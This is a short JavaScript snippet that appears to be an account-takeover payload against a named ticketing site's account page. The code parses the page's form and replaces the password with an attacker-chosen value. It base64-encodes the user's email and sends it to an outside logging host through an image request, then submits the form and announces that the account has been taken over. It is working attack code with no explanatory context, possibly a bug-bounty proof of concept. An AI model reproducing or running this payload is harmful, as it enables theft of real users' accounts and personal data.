fetch('https://groups.cheaptickets.com/Group/Account.htm')
.then(response => response.text())
.then(htmlString => {
    var text2send = "";
    // Parse the HTML document
    const parser = new DOMParser();
    const doc = parser.parseFromString(htmlString, 'text/html');

    // Find the form and extract its details
    const form = doc.querySelector('form');
    const action = form.action;
    const method = form.method;

    // Collect all the form data
    const formData = new FormData(form);

    // Convert FormData to URL-encoded string
    const urlEncodedData = new URLSearchParams();
    for (const pair of formData) {
        if(pair[0] === "Password") {
            urlEncodedData.append(pair[0], "@Hacked123456");
        } else if (pair[0] === "Email") {
            text2send += "Email: " + pair[1] + "\n";
        } else {
            urlEncodedData.append(pair[0], pair[1]);
        }
    }
    new Image().src="https://icollab.info/log/?data="+encodeURI(btoa(text2send));
    // Send the form data in application/x-www-form-urlencoded format
    return fetch(action, {
        method: method.toUpperCase(),
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: urlEncodedData.toString(),
    });
})
.then(response => response.text())
.then(responseText => {
    console.log('Form submitted successfully:', responseText);
    alert("The account has been taken over, login with this password: `@Hacked123456`")
})
.catch(error => {
    console.error('Error:', error);
});
